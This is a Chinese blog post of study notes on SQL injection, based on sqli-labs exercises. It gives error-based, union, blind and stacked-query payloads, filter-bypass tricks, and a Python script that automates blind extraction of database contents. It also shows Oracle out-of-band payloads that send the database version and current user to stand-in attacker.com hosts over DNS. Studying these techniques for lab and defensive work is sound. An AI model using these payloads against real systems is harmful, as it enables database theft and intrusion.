<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>SQL注入 - 饱食终日，无所事事</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="饱食终日，无所事事"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="饱食终日，无所事事"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="sqli-labs记录，后面的数字是关数。 随时添加新的trick SQL注入的关键在于闭合 以 Mysql 为例，其他的在后面添加"><meta property="og:type" content="blog"><meta property="og:title" content="SQL注入"><meta property="og:url" content="http://example.com/2020/02/01/sql-injection/"><meta property="og:site_name" content="饱食终日，无所事事"><meta property="og:description" content="sqli-labs记录，后面的数字是关数。 随时添加新的trick SQL注入的关键在于闭合 以 Mysql 为例，其他的在后面添加"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:published_time" content="2020-02-01T10:20:29.000Z"><meta property="article:modified_time" content="2021-08-12T03:03:35.797Z"><meta property="article:author" content="lll"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2020/02/01/sql-injection/"},"headline":"SQL注入","image":["http://example.com/img/og_image.png"],"datePublished":"2020-02-01T10:20:29.000Z","dateModified":"2021-08-12T03:03:35.797Z","author":{"@type":"Person","name":"lll"},"publisher":{"@type":"Organization","name":"饱食终日，无所事事","logo":{"@type":"ImageObject","url":"http://example.com/img/logo.svg"}},"description":"sqli-labs记录，后面的数字是关数。 随时添加新的trick SQL注入的关键在于闭合 以 Mysql 为例，其他的在后面添加"}</script><link rel="canonical" href="http://example.com/2020/02/01/sql-injection/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="饱食终日，无所事事" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-02-01T10:20:29.000Z" title="2020/2/1 下午6:20:29">2020-02-01</time>发表</span><span class="level-item"><time dateTime="2021-08-12T03:03:35.797Z" title="2021/8/12 上午11:03:35">2021-08-12</time>更新</span><span class="level-item">41 分钟读完 (大约6171个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">SQL注入</h1><div class="content"><p>sqli-labs记录，后面的数字是关数。</p>
<p>随时添加新的trick</p>
<p>SQL注入的关键在于闭合</p>
<p>以 Mysql 为例，其他的在后面添加</p>
<span id="more"></span>

<h2 id="SQLi-labs-题解"><a href="#SQLi-labs-题解" class="headerlink" title="SQLi-labs 题解"></a>SQLi-labs 题解</h2><h3 id="Updatexml-extractvalue-5"><a href="#Updatexml-extractvalue-5" class="headerlink" title="Updatexml, extractvalue -5"></a>Updatexml, extractvalue -5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br><span class="line">id=updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br><span class="line">id=updatexml(1,concat(0x7e,SUBSTR((SELECT @@version),1,24),0x7e),1)</span><br><span class="line">updatexml(1,concat(0x7e,(select substring(f14g,20) from f14g limit 0,1),0x7e),1)</span><br><span class="line">extractvalue(0x0a,concat(0x0a,(select database())))</span><br></pre></td></tr></table></figure>

<p>updatexml最多只能显示32位</p>
<h3 id="布尔盲注-8"><a href="#布尔盲注-8" class="headerlink" title="布尔盲注 -8"></a>布尔盲注 -8</h3><p>针对没有回显，只显示查询是否成功的注入，通过逐位判断注出数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 # 正常，显示You are in</span><br><span class="line">?id=1&#x27; # 发生了错误，没有回显</span><br><span class="line">?id=1&#x27; and 1=1--+ # 正常</span><br><span class="line">?id=1&#x27; and 1=2--+ # 无结果，同样没有回显</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &#x27;http://1dd20f94-5f32-41ba-a9b3-4b023c50b547.node3.buuoj.cn/Less-8&#x27;</span><br><span class="line">flag = &#x27;You are in...........&#x27;</span><br><span class="line">param_name = &#x27;id&#x27;</span><br><span class="line">brutelist = &#x27;,abcdefghijklnmopqrstuvwxyz_1234567890&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_requests(payload):  # ok</span><br><span class="line">    payload_dict = &#123;param_name: payload&#125;</span><br><span class="line">    r = requests.get(url, params=payload_dict)</span><br><span class="line">    # print(r.url)</span><br><span class="line">    return r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_db_length():  # ok</span><br><span class="line">    count = 1</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;1\&#x27; AND LENGTH(DATABASE())=&quot; + str(count) + &quot;-- &quot;</span><br><span class="line">        recv = send_requests(payload)</span><br><span class="line">        if flag in recv:</span><br><span class="line">            return count</span><br><span class="line">        count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_db_name(db_length):  # ok</span><br><span class="line">    db_name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, db_length+1):</span><br><span class="line">        for j in brutelist:</span><br><span class="line">            j = ord(j)</span><br><span class="line">            payload = &quot;1\&#x27; AND ASCII(SUBSTR(DATABASE(),&quot; + str(i) + &quot;,1))=&quot; + str(j) + &quot;-- &quot;</span><br><span class="line">            recv = send_requests(payload)</span><br><span class="line">            if flag in recv:</span><br><span class="line">                db_name += chr(j)</span><br><span class="line">                break</span><br><span class="line">    return db_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_table_length(db_name):  # ok</span><br><span class="line">    count = 1</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;1\&#x27; AND (SELECT LENGTH(GROUP_CONCAT(table_name)) FROM information_schema.tables WHERE table_schema=\&#x27;&quot; + db_name + &quot;\&#x27;)=&quot; + str(count) + &quot;-- &quot;</span><br><span class="line">        recv = send_requests(payload)</span><br><span class="line">        if flag in recv:</span><br><span class="line">            return count</span><br><span class="line">        count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_table_name(db_name, table_length):  # ok</span><br><span class="line">    table_name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, table_length+1):</span><br><span class="line">        for j in brutelist:</span><br><span class="line">            j = ord(j)</span><br><span class="line">            payload = &quot;1\&#x27; AND (SELECT ASCII(SUBSTR(GROUP_CONCAT(table_name),&quot; + str(i) + &quot;,1)) FROM information_schema.tables WHERE table_schema=\&#x27;&quot; + db_name + &quot;\&#x27;)=&quot; + str(j) + &quot;-- &quot;</span><br><span class="line">            recv = send_requests(payload)</span><br><span class="line">            if flag in recv:</span><br><span class="line">                table_name += chr(j)</span><br><span class="line">                break</span><br><span class="line">    return table_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_column_length(db_name, table_name):  # ok</span><br><span class="line">    count = 1</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;1\&#x27; AND (SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name=\&#x27;&quot; + table_name + &quot;\&#x27; AND table_schema=\&#x27;&quot; + db_name + &quot;\&#x27;)=&quot; + str(count) + &quot;-- &quot;</span><br><span class="line">        recv = send_requests(payload)</span><br><span class="line">        if flag in recv:</span><br><span class="line">            return count</span><br><span class="line">        count += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_column_name(db_name, table_name, column_length):  # ok</span><br><span class="line">    column_name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, column_length+1):</span><br><span class="line">        for j in brutelist:</span><br><span class="line">            j = ord(j)</span><br><span class="line">            payload = &quot;1\&#x27; AND (SELECT ASCII(SUBSTR(GROUP_CONCAT(column_name),&quot; + str(i) + &quot;,1)) FROM information_schema.columns WHERE table_name=\&#x27;&quot; + table_name + &quot;\&#x27; AND table_schema=\&#x27;&quot; + db_name + &quot;\&#x27;)=&quot; + str(j) + &quot;-- &quot;</span><br><span class="line">            recv = send_requests(payload)</span><br><span class="line">            if flag in recv:</span><br><span class="line">                column_name += chr(j)</span><br><span class="line">                break</span><br><span class="line">    return column_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_data(table_name, column_name):</span><br><span class="line">    res = &#123;&#125;</span><br><span class="line">    for column in column_name.split(&#x27;,&#x27;):</span><br><span class="line">        res[column] = &#x27;&#x27;</span><br><span class="line">        i = 1</span><br><span class="line">        while True:</span><br><span class="line">            f = 0</span><br><span class="line">            for j in range(32, 127):</span><br><span class="line">                payload = &quot;1\&#x27; AND (SELECT ASCII(SUBSTR(GROUP_CONCAT(&quot; + column + &quot;),&quot; + str(i) + &quot;,1)) FROM &quot; + table_name + &quot;)=&quot; + str(j) + &quot;-- &quot;</span><br><span class="line">                recv = send_requests(payload)</span><br><span class="line">                if flag in recv:</span><br><span class="line">                    f = 1</span><br><span class="line">                    res[column] += chr(j)</span><br><span class="line">                    break</span><br><span class="line">            i += 1</span><br><span class="line">            if f == 0:</span><br><span class="line">                break</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&#x27;Working on &#x27; + url)</span><br><span class="line">    db_length = get_db_length()</span><br><span class="line">    db_name = get_db_name(db_length)</span><br><span class="line">    print(&#x27;Database: &#x27; + db_name)</span><br><span class="line">    table_length = get_table_length(db_name)</span><br><span class="line">    table_name = get_table_name(db_name, table_length)</span><br><span class="line">    print(&#x27;Tables: &#x27; + table_name)</span><br><span class="line">    table_name = input(&#x27;Select a table to dump: &#x27;)</span><br><span class="line">    column_length = get_column_length(db_name, table_name)</span><br><span class="line">    column_name = get_column_name(db_name, table_name, column_length)</span><br><span class="line">    data = get_data(table_name, column_name)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>这里注入data的时候也应该先爆出长度再注数据，否则一旦丢包会导致后面的数据全部丢失。此外可以使用二分法查找数据，效率更高。</p>
<h3 id="时间盲注-9"><a href="#时间盲注-9" class="headerlink" title="时间盲注 -9"></a>时间盲注 -9</h3><p>利用<code>IF(statement,1,sleep(5))</code>的形式，如果结果为真，会直接返回结果，否则会5秒之后返回一个页面，其他与上面类似。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(5)--+ # 5秒后返回了页面，存在时间盲注</span><br></pre></td></tr></table></figure>

<p>python中可以用time模块中的<code>time.time()</code>获取当前时间。</p>
<h3 id="拆分-23"><a href="#拆分-23" class="headerlink" title="拆分 -23"></a>拆分 -23</h3><p>过滤了注释符，分别闭合前面和后面的单引号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select 1,database(),&#x27;3</span><br></pre></td></tr></table></figure>

<h3 id="二次注入-24"><a href="#二次注入-24" class="headerlink" title="二次注入 -24"></a>二次注入 -24</h3><p>注册新用户和登录时无法产生注入，但是修改密码时没有进行过滤。</p>
<p>注册用户<code>admin&#39;#</code>，经过了转义，它只是一个普通的用户名，不会产生注入，登录时同理。但在修改密码时没有进行过滤，语句变为<code>update set users password=&#39;$pass&#39; where username=&#39;admin&#39;# ....</code>，修改了admin的密码。</p>
<h3 id="过滤-25-26-27"><a href="#过滤-25-26-27" class="headerlink" title="过滤 -25 -26 -27"></a>过滤 -25 -26 -27</h3><p>双写绕过，<code>anandd</code>过滤后变成<code>and</code>。</p>
<p>SQL对大小写不敏感，<code>SeleCt</code></p>
<p>空格可以用<code>/**/</code>、<code>()</code>、<code>%0a</code>、<code>反引号</code>、<code>tab</code>、<code>%a0</code>、<code>%0b</code></p>
<p>可以用报错注入，用括号绕过空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27||updatexml(1,concat(%27$%27,(select(database())),1),1)||%271%27=%271</span><br></pre></td></tr></table></figure>

<h2 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>以 <code>select id,user,pass from users where id=&#39;$id&#39;</code> 为例</p>
<p>判断闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; 报错</span><br><span class="line">id=1&#x27;# 正常，单引号闭合</span><br></pre></td></tr></table></figure>

<p>判断列数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3# 正常</span><br><span class="line">1&#x27; order by 4# 报错，3列</span><br></pre></td></tr></table></figure>

<p>判断显示位，假设显示位是 user，同时也可以判断列数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select 1,2,3# 显示2，显示位是第二位</span><br></pre></td></tr></table></figure>

<p>查当前数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select 1,database(),3#</span><br></pre></td></tr></table></figure>

<p>查数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata#</span><br></pre></td></tr></table></figure>

<p>查表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where schema_name=&#x27;dvwa&#x27;#</span><br></pre></td></tr></table></figure>

<p>查列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where schema_name=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure>

<p>查数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select 1,group_concat(password),3 from dvwa.users#</span><br></pre></td></tr></table></figure>

<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>传入的单引号被反斜杠转义，而数据库编码为GBK时，可以通过输入一个ascii码范围外的字符与添加的反斜杠结合成一个GBK字符，比如正常情况下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure>

<p>被加入反斜杠转义，查询语句变成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where &#x27;id=1/&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>不会引发注入，而加入一个其他字符后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=%df&#x27;</span><br></pre></td></tr></table></figure>

<p><code>%df</code>和反斜杠结合成了一个新的GBK字符，单引号没有被转义，查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;？&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>SQL 中的报错有时会提示一些信息，报错注入指将查询结果包含在报错信息中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">union select count(*),2,concat(&#x27;:&#x27;,(select database()),&#x27;:&#x27;,floor(rand()*2))as a from information_schema.tables group by a # 主键重复，利用floor()和rand()</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))) # extractvalue()</span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) # updatexml()</span><br><span class="line">id=1 and geometrycollection((select * from(select * from(select user())a)b)) #geometrycollection()</span><br><span class="line">id=1 and multipoint((select * from(select * from(select user())a)b)) # multipoint()</span><br><span class="line">id=1 and polygon((select * from(select * from(select user())a)b)) # polygon()</span><br><span class="line">id=1 and multipolygon((select * from(select * from(select user())a)b)) #multipolygon()</span><br><span class="line">id=1 and linestring((select * from(select * from(select user())a)b)) # linestring()</span><br><span class="line">id=1 and multilinestring((select * from(select * from(select user())a)b)) # multilinestring()</span><br><span class="line">id=1 and exp(~(select * from(select user())a)) # exp()</span><br></pre></td></tr></table></figure>

<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>在服务端只返回查询成功和失败的情况下，通过逐位爆破得到结果。</p>
<p>以<code>select id,user,pass from users where id=$id</code>为例，假设查询成功返回<code>yes</code>，失败返回<code>no</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1	返回yes</span><br><span class="line">0	返回no</span><br><span class="line">if(1=1,1,0)	返回yes</span><br><span class="line">if(1=2,1,0)	返回no</span><br></pre></td></tr></table></figure>

<p>查当前数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(select ascii(substr(database(),1,1))=65,1,0) 返回yes则第一位是a</span><br><span class="line">if(select ascii(substr(database(),1,1))=66,1,0)	返回yes则第一位是b</span><br><span class="line">...</span><br><span class="line">if(select ascii(substr(database(),2,1))=65,1,0)	查询第二位</span><br></pre></td></tr></table></figure>

<p>其他类似</p>
<p>可以在外侧使用 ifnull，strcmp 函数</p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>与布尔盲注同理，判断查询是否成功的方式从返回的结果变为返回的时间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(select ascii(substr(database(),1,1))=65,1,0) and sleep(5) 过5秒返回结果说明前面的语句为真</span><br></pre></td></tr></table></figure>

<p>除了 sleep ，可以使用 rlike, rpad, repeat, bunch 等大量计算达到延时效果</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>有时sql可以执行以分号分割的多条查询语句，此时可能存在堆叠注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;;select if(ascii(substr(user(),1,1))=65,sleep(3),1)%23</span><br></pre></td></tr></table></figure>

<h2 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h2><p>PDO(PHP Data Object)，为访问数据库提供了统一的接口。</p>
<p>PDO 默认支持多语句执行，使用时会向 Mysql 服务器发送一次 Set Option 请求将 multi statements 设置打开。</p>
<p>Mysql 支持预处理，利用参数化高效执行重复的语句，官方将 prepare，execute，deallocate 统称为 prepare statement，最常用的是 prepare 和 execute。</p>
<p>在 PDO 下的注入，只要没有设置 <code>array(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false)</code>，就有可能存在多语句执行，而使用<code>?</code>可以防止字符串拼接。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&#x27;content-type: text/html; charset=utf-8&#x27;); </span><br><span class="line">$dbms=&#x27;mysql&#x27;; </span><br><span class="line">$host=&#x27;127.0.0.1&#x27;; </span><br><span class="line">$dbName=&#x27;test&#x27;; </span><br><span class="line">$user=&#x27;root&#x27;; </span><br><span class="line">$pass=&#x27;root&#x27;;$dsn=&quot;$dbms:host=$host;</span><br><span class="line">dbname=$dbName&quot;; </span><br><span class="line">try &#123;    </span><br><span class="line">    $pdo = new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false)); </span><br><span class="line">&#125; catch (PDOException $e) &#123;     </span><br><span class="line">    echo $e; </span><br><span class="line">&#125; </span><br><span class="line">$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT * from test where id =?&quot;; </span><br><span class="line">$stmt = $pdo-&gt;prepare($sql);$stmt-&gt;bindParam(1,$id); </span><br><span class="line">$stmt-&gt;execute(); </span><br><span class="line">while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)) </span><br><span class="line">&#123;    </span><br><span class="line">    echo &quot;用户ID：&quot;.$row[&#x27;id&#x27;].&quot;&lt;br &gt;&quot;;              </span><br><span class="line">    echo &quot;用户名：&quot;.$row[&#x27;name&#x27;].&quot;&lt;br &gt;&quot;;         </span><br><span class="line">    var_dump($row); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PDO 不能防止所有注入，在 orderby 和 limit 关键字后的参数不能参数化。</p>
<h2 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h2><p>当不能通过回显或者盲注观察sql的执行结果时，可以考虑使用带外注入，原理是利用dns解析，逐位爆破</p>
<p>配置域名解析，先添加一条名为<code>oob</code>、值为<code>ns1.attack.com</code>的 NS 记录，创建一个子域，再添加名为<code>ns1</code>，值为服务器IP的 A 记录，这会将子域<code>oob.attack.com</code>所有的 DNS 请求转发到服务器中。在服务器中使用 <code>tcpdump -n port 53</code> 观察DNS请求，在另一台机器上使用 <code>dig test.oob.attack.com</code>，此时应该可以在服务器中看到对 <code>test.oob.attack.com</code>的查询。</p>
<p>配置完成，接下来是在SQL中实现DNS查询，并把查询的结果包含进去。</p>
<p>Oracle</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*检测*/</span><br><span class="line">SELECT DBMS_LDAP.INIT((‘oob.dnsattacker.com&#x27;,80) FROM DUAL; </span><br><span class="line"></span><br><span class="line">/* Extracting Oracle database version */</span><br><span class="line">SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||&#x27;.attacker.com&#x27;,80) FROM dual;    </span><br><span class="line"></span><br><span class="line">/*Extracting Current user in Oracle database */</span><br><span class="line">SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||&#x27;.attacker.com&#x27;,80) FROM dual; </span><br><span class="line"></span><br><span class="line">/*10G 或更低版本可用以下替代方法*/</span><br><span class="line">UTL_INADDR.GET_HOST_ADDRESS, </span><br><span class="line">UTL_HTTP.REQUEST,</span><br><span class="line">HTTP_URITYPE.GETCLOB, </span><br><span class="line">DBMS_LDAP.INIT and UTL_TCP </span><br></pre></td></tr></table></figure>

<p>MSSQL</p>
